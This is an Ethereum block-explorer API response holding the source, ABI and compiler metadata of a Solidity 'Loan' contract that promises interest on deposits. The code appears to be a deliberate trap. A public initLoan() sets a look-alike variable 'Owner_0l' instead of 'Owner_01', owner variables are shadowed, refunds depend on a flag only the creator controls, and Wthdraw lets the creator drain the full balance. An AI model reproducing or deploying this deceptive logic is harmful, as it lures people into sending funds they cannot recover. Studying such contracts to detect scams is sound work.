{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.16;\r\n\r\ncontract Base \r\n{\r\n    address Creator = msg.sender;\r\n    address Owner_01 = msg.sender;\r\n    address Owner_02;\r\n    address Owner_03;\r\n    \r\n    function add(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        uint256 z = x + y;\r\n        if((z >= x) && (z >= y))\r\n        {\r\n          return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n\r\n    function sub(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        if(x >= y)\r\n        {\r\n           uint256 z = x - y;\r\n           return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n\r\n    function mul(uint256 x, uint256 y) \r\n    internal \r\n    returns (uint256) \r\n    {\r\n        uint256 z = x * y;\r\n        if((x == 0) || (z / x == y))\r\n        {\r\n            return z;\r\n        }\r\n        else\r\n        {\r\n            revert();\r\n        }\r\n    }\r\n    \r\n    event Deposit(address indexed sender, uint value);\r\n    \r\n    event Invest(address indexed sender, uint value);\r\n    \r\n    event Refound(address indexed sender, uint value);\r\n    \r\n    event Withdraw(address indexed sender, uint value);\r\n    \r\n    event Log(string message);\r\n}\r\n\r\ncontract Loan is Base\r\n{\r\n    struct Creditor\r\n    {\r\n        uint Time;\r\n        uint Invested;\r\n    }\r\n    \r\n    uint public TotalInvested;\r\n    uint public Available;\r\n    uint public InvestorsQty;\r\n    uint public prcntRate = 1;\r\n    bool CanRefound;\r\n    \r\n    address Owner_0l;\r\n    address Owner_02;\r\n    address Owner_03;\r\n    \r\n    mapping (address => uint) public Investors;\r\n    mapping (address => Creditor) public Creditors;\r\n    \r\n    function initLoan()\r\n    {\r\n        Owner_0l = msg.sender;\r\n    }\r\n    \r\n    function SetScndOwner(address addr) \r\n    public \r\n    {\r\n        require((msg.sender == Owner_02)||(msg.sender==Creator));\r\n        Owner_02 = addr;\r\n    }\r\n    \r\n    function SetThrdOwner(address addr) \r\n    public \r\n    {\r\n        require((msg.sender == Owner_02)||(msg.sender==Creator));\r\n        Owner_03 = addr;\r\n    }\r\n    \r\n    function SetPrcntRate(uint val)\r\n    public\r\n    {\r\n        if(val>=1&&msg.sender==Creator)\r\n        {\r\n            prcntRate = val;  \r\n        }\r\n    }\r\n    \r\n    function StartRefound(bool val)\r\n    public\r\n    {\r\n        if(msg.sender==Creator)\r\n        { \r\n            CanRefound = val;\r\n        }\r\n    }\r\n    \r\n    function() payable\r\n    {\r\n        InvestFund();\r\n    }\r\n    \r\n    function InvestFund() \r\n    public\r\n    payable\r\n    {\r\n        if(msg.value>= 1 ether)\r\n        {\r\n            if(Investors[msg.sender]==0)InvestorsQty++;\r\n            Investors[msg.sender]+=msg.value;\r\n            TotalInvested+=msg.value;\r\n            Available+=msg.value;\r\n            Invest(msg.sender,msg.value);\r\n        }   \r\n    }\r\n    \r\n    function ToLend() \r\n    public \r\n    payable\r\n    {\r\n        Creditors[msg.sender].Time = now;\r\n        Creditors[msg.sender].Invested += msg.value;\r\n        Deposit(msg.sender,msg.value);\r\n    }\r\n    \r\n    function CheckProfit(address addr) \r\n    public \r\n    constant \r\n    returns(uint)\r\n    {\r\n        return ((Creditors[addr].Invested/100)*prcntRate)*((now-Creditors[addr].Time)/1 days);\r\n    }\r\n    \r\n    function TakeBack() \r\n    public \r\n    payable\r\n    {\r\n        uint profit = CheckProfit(msg.sender);\r\n        if(profit>0&&CanRefound)\r\n        {\r\n            uint summ = Creditors[msg.sender].Invested+profit;\r\n            Creditors[msg.sender].Invested = 0;\r\n            msg.sender.transfer(summ);\r\n            Refound(msg.sender,summ);\r\n        }\r\n    }\r\n    \r\n    function WithdrawToInvestor(address _addr, uint _wei) \r\n    public \r\n    payable\r\n    {\r\n        if(Investors[_addr]>0)\r\n        {\r\n            if(isOwner())\r\n            {\r\n                 if(_addr.send(_wei))\r\n                 {\r\n                   Available-=_wei;\r\n                   Withdraw(_addr,_wei);\r\n                 }\r\n            }\r\n        }\r\n    }\r\n    \r\n    function Wthdraw()\r\n    public\r\n    payable\r\n    {\r\n        if(msg.sender==Creator)\r\n        {\r\n            Creator.transfer(this.balance);\r\n        }\r\n    }\r\n    \r\n    \r\n    function isOwner()\r\n    private\r\n    constant \r\n    returns (bool)\r\n    {\r\n        return( msg.sender == Owner_01 || msg.sender == Owner_02 || msg.sender == Owner_03);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"TotalInvested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"TakeBack\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"InvestFund\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"SetScndOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"InvestorsQty\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"SetPrcntRate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"prcntRate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"CheckProfit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"initLoan\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Wthdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"},{\"name\":\"_wei\",\"type\":\"uint256\"}],\"name\":\"WithdrawToInvestor\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"ToLend\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"StartRefound\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"Available\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"SetThrdOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Creditors\",\"outputs\":[{\"name\":\"Time\",\"type\":\"uint256\"},{\"name\":\"Invested\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Investors\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Invest\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Refound\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"message\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"}]","ContractName":"Loan","CompilerVersion":"v0.4.16+commit.d7661dd9","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://24a3e2c5380664c64977ffb42e31b1de982b336ae50f0892c302cb38f9fb8c3e"}]}